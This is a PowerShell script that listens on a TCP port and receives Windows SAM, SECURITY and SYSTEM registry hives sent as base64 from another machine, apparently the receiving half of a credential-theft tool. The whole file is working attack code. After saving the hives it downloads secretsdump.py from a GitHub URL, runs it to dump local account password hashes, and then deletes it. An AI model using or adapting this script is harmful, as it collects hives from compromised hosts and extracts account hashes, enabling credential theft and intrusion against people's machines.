function Invoke-Reciever {
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [int]
        $port = 9000
    )
    Write-Host
    Write-Host
    Write-Host Starting Server...

    $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
    $listener = new-object System.Net.Sockets.TcpListener $endpoint
    $listener.start()
    $count1 = New-Object byte[] 1024
    $count2 = New-Object byte[] 1024
    $count3 = New-Object byte[] 1024

    Write-Host Waiting For Connection...

    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()

    Write-Host Connected
    Write-Host
    Write-Host Recieveing Data...

    $stream.read($count1, 0, $count1.Length)
    $stream.Write('0',0,1)
    $stream.read($count2, 0, $count2.Length)
    $stream.Write('0',0,1)
    $stream.read($count3, 0, $count3.Length)
    0..([int]($count1.Length)-1) | ForEach-Object {if ($count1[$_] -ne 0){$size1+=[text.encoding]::ASCII.GetString($count1[$_])}}
    0..([int]($count2.Length)-1) | ForEach-Object {if ($count2[$_] -ne 0){$size2+=[text.encoding]::ASCII.GetString($count2[$_])}}
    0..([int]($count3.Length)-1) | ForEach-Object {if ($count3[$_] -ne 0){$size3+=[text.encoding]::ASCII.GetString($count3[$_])}}
    $msg1 = New-Object byte[] $size1
    $msg2 = New-Object byte[] $size2
    $msg3 = New-Object byte[] $size3
    $stream.Write('0',0,1)
    $stream.read($msg1, 0, $msg1.Length)
    $stream.Write('0',0,1)
    $stream.read($msg2, 0, $msg2.Length)
    $stream.Write('0',0,1)
    $stream.read($msg3, 0, $msg3.Length)
    $stream.Write('0',0,1)

    Write-Host Recieved all Data
    Write-Host
    Write-Host Stopping Server
    Write-Host

    $listener.Stop()
    $listener.Server.Dispose()

    Write-Host Starting Data Processing...
    Write-Host Processing SAM

    $msg1 = [text.encoding]::ASCII.GetString($msg1)
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SAM'), [Convert]::FromBase64String($msg1))

    Write-Host Processed SAM
    Write-Host Processing SECURITY

    $msg2 = [text.encoding]::ASCII.GetString($msg2)
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SECURITY'), [Convert]::FromBase64String($msg2))

    Write-Host Processed SECURITY
    Write-Host Processing SYSTEM

    $msg3 = [text.encoding]::ASCII.GetString($msg3)
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SYSTEM'), [Convert]::FromBase64String($msg3))

    Write-Host Processed SYSTEM
    Write-Host
    Write-Host Finished Processing
    Write-Host
    Write-Host Dumping Hashes With secretsdump.py
    Write-Host
    Write-Host

    wget "http://raw.github.com/mo-tec/HashExtractor/master/secretsdump.py" -UseBasicParsing -out (Join-Path (resolve-path './') '/secretsdump.py')
    .\secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
    del ./secretsdump.py
    pause
}
Invoke-Reciever